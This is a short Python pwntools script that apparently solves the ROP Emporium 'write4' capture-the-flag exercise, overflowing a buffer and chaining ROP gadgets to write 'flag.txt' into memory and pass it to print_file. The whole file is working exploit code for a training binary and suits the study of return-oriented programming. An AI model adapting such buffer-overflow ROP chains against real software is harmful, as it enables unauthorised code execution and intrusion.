from pwn import *

binary = './write4'
elf = context.binary = ELF(binary)

p = process(binary)

p.recv()

pop_rdi = p64(0x0000000000400693) #: pop rdi ; ret
pop_r14_r15 = p64(0x0000000000400690) #: pop r14 ; pop r15 ; ret
r15_to_r14 = p64(0x0000000000400628) #: mov qword ptr [r14], r15 ; ret
ret = p64(0x00000000004004e6) # : ret
bss = p64(elf.bss() + 8)
system = p64(elf.plt.print_file)

payload = b'a'*40
payload+= ret
payload+= pop_r14_r15
payload+= bss
payload+= b'flag.txt'
payload+= r15_to_r14
payload+= pop_rdi
payload+= bss
payload+= system

p.sendline(payload)
p.interactive()